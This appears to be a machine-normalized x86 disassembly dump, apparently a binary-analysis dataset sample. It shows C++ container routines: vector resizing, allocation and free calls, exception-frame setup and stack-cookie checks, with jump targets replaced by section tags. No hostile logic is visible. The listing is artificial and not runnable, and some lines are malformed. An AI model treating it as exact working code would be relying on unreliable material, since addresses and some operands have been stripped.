push edx
push ecx
push eax
call sub_100024a0
mov ecx [ edi + 0x4 ]
sub ecx [ edi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
add esp 0x1c
lea edx [ eax * 8 ]
sub edx eax
mov eax [ esi ]
pop ebx
lea ecx [ eax + edx * 4 ]
pop edi
mov [ esi + 0x4 ] ecx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push edx
push ecx
push eax
push eax
call sub_10003fd0
mov edx [ esi + 0x4 ]
mov edi eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0xc ]
push ecx
push edx
push edi
call sub_100024a0
add esp 0x20
mov [ esi + 0x4 ] edi
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov eax [ edi ]
lea edx [ ecx * 8 ]
sub edx ecx
lea ecx [ eax + edx * 4 ]
push ebx
push ecx
push eax
mov [ ebp + 0x8 ] ecx
call sub_10003fa0
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov edi [ edi + 0x4 ]
push ecx
lea edx [ esi + 0xc ]
push edx
push eax
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_10004060
add esp 0x20
pop ebx
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ edi + 0x4 ]
sub ecx [ edi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
push eax
mov ecx esi
call sub_100013f0
test al al
je r-xdata
mov eax [ esi + 0x4 ]
push eax
push ebx
mov ecx esi
call sub_100025a0
mov ecx [ esi ]
push ecx
call sub_10019ce4
add esp 0x4
pop ebx
mov edx [ esi ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
push edx
push eax
push ecx
mov ecx esi
call sub_100047a0
mov [ esi + 0x4 ] eax
sub_10004fe0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_10004b10
sub esi ecx
sar esi 0x3
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x8
pop edi
pop esi
pop ebp
retn 0x4
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
cmp eax esi
je r-xdata
mov eax [ edi ]
lea ecx [ eax + esi * 8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
mov ecx edi
call sub_10004b10
mov edx [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ esi + 0x4 ] ecx
mov edx [ esi ]
mov ecx [ eax ]
mov [ eax ] edx
mov [ esi ] ecx
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
cmp eax ecx
je r-xdata
mov esi [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] esi
mov [ ecx + 0x4 ] edx
mov esi [ ecx ]
mov edx [ eax ]
mov [ eax ] esi
mov [ ecx ] edx
add [ edi + 0x4 ] 0x8
pop edi
pop esi
pop ebp
retn 0x4
sub_10005090
push ebp
mov ebp esp
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
mov eax [ ebp + 0x8 ]
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0x9249249
sub edx eax
push edi
cmp edx esi
jae r-xdata
mov edi [ ecx + 0x8 ]
add esi eax
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_100190f4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_10004b70
mov eax esi
cmp eax esi
jae r-xdata
sub_10005110
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c0c3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ebx [ edi + 0x28 ]
sub ebx [ edi + 0x24 ]
xor esi esi
sar ebx 0x2
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] 0xe
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x38 ] esi
mov ecx [ edi + 0x4c ]
mov edx [ edi + 0x50 ]
sub edx ecx
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0xd ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
lea edx [ ebx + ecx - 0x1 ]
lea ebx [ edx + ebx * 2 - 0x2 ]
push 0x1
push ebx
mov [ ebp - 0x14 ] ebx
call sub_1001a8ef
mov ebx eax
add esp 0x8
mov [ ebp - 0x28 ] ebx
test ebx ebx
jne r-xdata
mov edi edi
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov cx [ eax ]
mov [ ebx ] cx
mov edx [ edi + 0x5c ]
mov ecx [ ebp - 0x3c ]
lea esi [ ebx + 0x2 ]
mov [ esi ] edx
mov eax [ edi + 0x60 ]
mov edx [ ebp - 0x40 ]
mov [ esi + 0x4 ] eax
mov eax ecx
sub eax edx
sar eax 0x3
add esi 0x8
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov edi [ ebp - 0x40 ]
cmp edi esi
je r-xdata
mov al [ ebp - 0xd ]
mov ecx [ edi + 0x4c ]
mov edx [ edi + 0x50 ]
inc al
movzx esi al
mov [ ebp - 0xd ] al
sub edx ecx
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jb r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx + 0x1 ]
push 0x8
mov [ ebp - 0x14 ] edx
call sub_1001a818
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
cmp edx ecx
je r-xdata
add ebx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ebx
xor ebx ebx
mov [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
mov eax [ ebp - 0x28 ]
push eax
push edi
push esi
push esi
call sub_10003b30
mov ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0x34 ]
push edx
mov ebx eax
push esi
push ebx
call sub_10003bb0
add esp 0x20
mov [ ebp - 0x3c ] ebx
mov esi ebx
lea edx [ ebp - 0x18 ]
push edx
sub esp 0x14
lea eax [ esi + esi * 4 ]
mov dx [ ecx + eax * 4 ]
lea eax [ ecx + eax * 4 ]
mov ecx esp
mov [ ecx ] dx
movzx edx [ eax + 0x2 ]
mov [ ecx + 0x2 ] dl
movzx edx [ eax + 0x3 ]
add eax 0x4
mov [ ebp - 0x28 ] esp
mov [ ecx + 0x3 ] dl
push eax
add ecx 0x4
mov [ ebp - 0x18 ] 0x0
call sub_100025c0
mov ecx edi
call sub_10004910
mov esi eax
test esi esi
je r-xdata
mov esi [ ebp - 0x3c ]
xor eax eax
mov edx [ ebp - 0x18 ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax 0x1
mov [ ebp - 0xd ] 0x1
cmp [ ebp - 0x1c ] eax
jbe r-xdata
mov eax [ ebp - 0x28 ]
push eax
push edx
push ecx
push ecx
call sub_10003b30
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
push ecx
mov ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x34 ]
push edx
push ecx
push eax
call sub_10003bb0
mov edx [ ebp - 0x28 ]
add esp 0x20
mov [ ebp - 0x3c ] edx
mov ebx [ ebp - 0x28 ]
mov edx [ ebp - 0x40 ]
mov ecx [ ebp - 0x3c ]
mov cl [ rw-data ]
mov [ esi ] cl
mov eax [ edx + ebx * 8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
push ecx
inc esi
push esi
call sub_1001a92f
mov ecx [ ebp - 0x40 ]
mov al [ ebp - 0xd ]
mov ebx [ ecx + ebx * 8 ]
add esi [ ebx + 0x4 ]
inc al
movzx ebx al
add esp 0x10
mov [ ebp - 0xd ] al
cmp ebx [ ebp - 0x20 ]
jb r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
push esi
push edi
call sub_10003bb0
push edi
call sub_10019ce4
add esp 0x14
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
push eax
lea ecx [ ebp - 0x30 ]
call sub_10003440
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
call sub_10004fe0
mov esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
push 0x10
call sub_1001a818
mov esi eax
add esp 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x2
test esi esi
je r-xdata
lea ecx [ esi + 0x2 ]
mov [ ebp - 0x18 ] ecx
lea esp [ esp ]
mov edx [ ebp - 0x40 ]
mov eax [ edx + ebx * 8 ]
mov eax [ eax + 0x4 ]
add eax esi
cmp eax [ ebp - 0x18 ]
ja r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor esi esi
movzx ecx [ rw-data ]
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov [ ebp - 0x28 ] ecx
mov ecx edi
call eax
mov cl [ ebp - 0x28 ]
mov edx [ ebp - 0x14 ]
movzx eax ax
mov [ esi + 0x4 ] ax
mov [ esi + 0x6 ] 0x1
mov [ esi + 0x7 ] cl
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] edx
mov [ esi ] 0x0
jmp r-xdata
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
movzx eax al
cmp eax [ ebp - 0x1c ]
jb r-xdata
mov ecx [ ebp - 0x14 ]
lea edx [ ebx + ecx ]
mov ecx [ ebp - 0x18 ]
cmp ecx edx
ja r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov esi [ ebp - 0x20 ]
sub esp 0x8
mov eax esp
mov [ ebp - 0x28 ] esp
mov [ ebp - 0x28 ] eax
mov [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
test esi esi
je r-xdata
mov eax [ eax ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] eax
xor eax eax
push esi
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
call sub_10003170
mov eax [ edi + 0x38 ]
mov [ ebp - 0x4 ] 0x3
cmp eax [ edi + 0x3c ]
je r-xdata
mov edx [ edi + 0x24 ]
mov eax [ edx + eax * 4 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
test eax eax
je r-xdata
mov dl [ rw-data ]
mov [ esi ] dl
mov ax [ eax ]
mov [ esi + 0x1 ] ax
add esi 0x3
add ecx 0x3
mov [ ebp - 0x18 ] ecx
mov ecx edi
call sub_10003c10
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov esi [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov esi [ ebp - 0x20 ]
lea esi [ ecx + 0x1 ]
mov ebx edx
mov eax ecx
[ ebx ] esi
cmp eax ecx
je r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
push edx
push esi
call sub_10003bb0
push esi
call sub_10019ce4
add esp 0x14
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ebx [ ebp - 0x28 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx [ edx ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov esi [ ebp - 0x20 ]
mov ecx [ ebp - 0x24 ]
mov [ ebx + 0x4 ] esi
mov [ ebx ] ecx
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10005590
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c102
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ edi + 0x4 ]
mov esi [ ebp + 0x8 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10005090
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0xffffffff
xor eax eax
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] ax
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10005090
push 0xffffffff
xor esi esi
push edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] edx
mov [ ecx ] si
push eax
jmp r-xdata
call sub_100019e0
sub_10005680
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x10 ]
lea esi [ eax + 0x3 ]
mov ax [ esi - 0x3 ]
mov [ edi ] ax
mov cl [ esi - 0x1 ]
mov [ edi + 0x2 ] cl
mov dl [ esi ]
lea eax [ esi + 0x1 ]
push eax
lea ecx [ edi + 0x4 ]
mov [ edi + 0x3 ] dl
call sub_10004e30
add esi 0x14
lea ecx [ esi - 0x3 ]
add edi 0x14
cmp ecx ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100056d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c130
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x44 ] ebx
xor ecx ecx
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x34 ] ebx
mov esi [ rw-data ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
cmp ecx esi
jae r-xdata
mov edx [ rw-data ]
mov dx [ edx + eax ]
mov [ ebp - 0x40 ] dx
mov edx [ rw-data ]
mov dl [ edx + eax ]
add esi eax
xor edi edi
mov [ ebp - 0x3e ] dl
cmp ecx ebx
jbe r-xdata
lea eax [ ebp - 0x3c ]
xor edx edx
push eax
lea ecx [ edi + 0x4 ]
mov [ edi ] edx
call sub_100025c0
mov eax edi
jmp r-xdata
mov esi [ ebp - 0x48 ]
mov dx [ ebp - 0x40 ]
mov cl [ ebp - 0x3d ]
mov al [ ebp - 0x3e ]
mov [ esi ] dx
lea edx [ ebp - 0x3c ]
mov [ esi + 0x3 ] cl
push edx
lea ecx [ esi + 0x4 ]
mov [ esi + 0x2 ] al
call sub_100025c0
mov edi [ ebp - 0x3c ]
cmp edi ebx
je r-xdata
movzx eax [ esi ]
movsx ecx [ rw-data ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0xc
mov eax esi
mov eax [ ebp - 0x44 ]
mov edx [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
push edx
push edi
call sub_100024a0
push edi
call sub_10019ce4
add esp 0x14
inc edi
inc esi
cmp edi [ ebp + 0x10 ]
jb r-xdata
inc esi
inc edi
xor edx edx
mov eax esi
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_100034e0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005590
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] bl
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
sub_10005830
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ esi + 0x8 ]
lea edx [ esi + 0x10 ]
push edx
push ecx
push eax
call sub_100024a0
mov edx [ esi + 0x4 ]
push edx
call sub_10019ce4
add esp 0x14
sub_10005880
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c171
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x14
mov [ ebp - 0x4 ] bl
mov [ ebp + 0x10 ] esi
add edi 0x14
jmp r-xdata
mov ax [ edi ]
mov [ esi ] ax
mov cl [ edi + 0x2 ]
mov [ esi + 0x2 ] cl
mov dl [ edi + 0x3 ]
lea eax [ edi + 0x4 ]
push eax
lea ecx [ esi + 0x4 ]
mov [ esi + 0x3 ] dl
call sub_100025c0
cmp edi [ ebp + 0xc ]
je r-xdata
sub_100058fc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1001a898
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x14 ]
lea esp [ esp ]
push esi
push ebx
call sub_10005830
add esi 0x14
add esp 0x8
cmp esi edi
jne r-xdata
sub_10005940
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c1ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
push 0x18
mov [ ebp - 0x4 ] ebx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
cmp edi ebx
jne r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] bl
call sub_10012790
push 0xc
push rw-data
mov ecx esi
call sub_10012770
movzx ecx [ ebp + 0xc ]
push ecx
sub esp 0x1c
mov edx esp
mov [ ebp + 0xc ] esp
push edx
mov ecx esi
call sub_10012c50
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov edi eax
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x10 ]
mov ecx [ edx + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push edi
call edx
mov esi eax
mov eax [ edi ]
cmp eax ebx
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
call sub_100025c0
jmp r-xdata
push edi
call sub_10019ce4
add esp 0x4
cmp esi ebx
je r-xdata
push eax
call sub_1001a3eb
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x8 ]
push eax
push ecx
mov ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x3c ]
push edx
call sub_100056d0
mov cx [ eax ]
mov dl [ eax + 0x2 ]
mov [ ebp - 0x28 ] cx
mov cl [ eax + 0x3 ]
add eax 0x4
mov [ ebp - 0x25 ] cl
push eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x26 ] dl
call sub_10004e30
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] bl
cmp eax ebx
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
mov edx [ ebp + 0xc ]
push edx
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x2c ]
push ecx
push edx
push eax
call sub_100024a0
mov eax [ ebp - 0x38 ]
push eax
call sub_10019ce4
add esp 0x14
push esi
call sub_10019ce4
mov esi [ ebp + 0x8 ]
mov cx [ ebp - 0x28 ]
mov dl [ ebp - 0x26 ]
mov al [ ebp - 0x25 ]
mov [ esi ] cx
add esp 0x4
lea ecx [ ebp - 0x24 ]
push ecx
lea ecx [ esi + 0x4 ]
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] al
call sub_100025c0
mov edi [ ebp - 0x24 ]
cmp edi ebx
je r-xdata
push eax
call sub_1001a3eb
add esp 0x4
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
push ecx
push edi
call sub_100024a0
push edi
call sub_10019ce4
add esp 0x14
sub_10005b20
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp edi [ ebp + 0xc ]
je r-xdata
pop edi
pop ebp
retn
push ebx
add edi 0x4
push esi
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
add edi 0x14
lea eax [ edi - 0x4 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov ebx [ edi + 0x4 ]
cmp esi ebx
je r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
pop ebx
mov edx [ edi ]
push edx
call sub_10019ce4
add esp 0x4
mov edi edi
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_10005b90
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c1d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xccccccc
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x66666667
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_100190f4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_10003010
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_10005880
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x66666667
imul ecx
sar edx 0x3
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax + eax * 4 ]
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi + edi * 4 ]
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_10005b20
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x14
sub_10005ca0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10005b20
mov edx [ esi ]
push edx
call sub_10019ce4
add esp 0x14
sub_10005cf0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x4 ]
push eax
push ecx
add eax 0x14
push eax
call sub_10005680
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edx
lea ecx [ esi + 0xc ]
push ecx
push eax
add eax 0xffffffec
push eax
call sub_10005b20
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
add esp 0x20
add [ esi + 0x4 ] 0xffffffec
mov [ eax ] edx
pop esi
pop ebp
retn 0x8
sub_10005d40
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x66666667
imul edx
mov eax [ ebp + 0x8 ]
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
mov edx 0xccccccc
sub edx eax
cmp edx esi
jae r-xdata
mov edx [ ecx + 0x8 ]
add esi eax
sub edx edi
mov eax 0x66666667
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_100190f4
pop edi
pop esi
pop ebp
retn 0x4
mov edx eax
shr edx 0x1
mov edi 0xccccccc
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
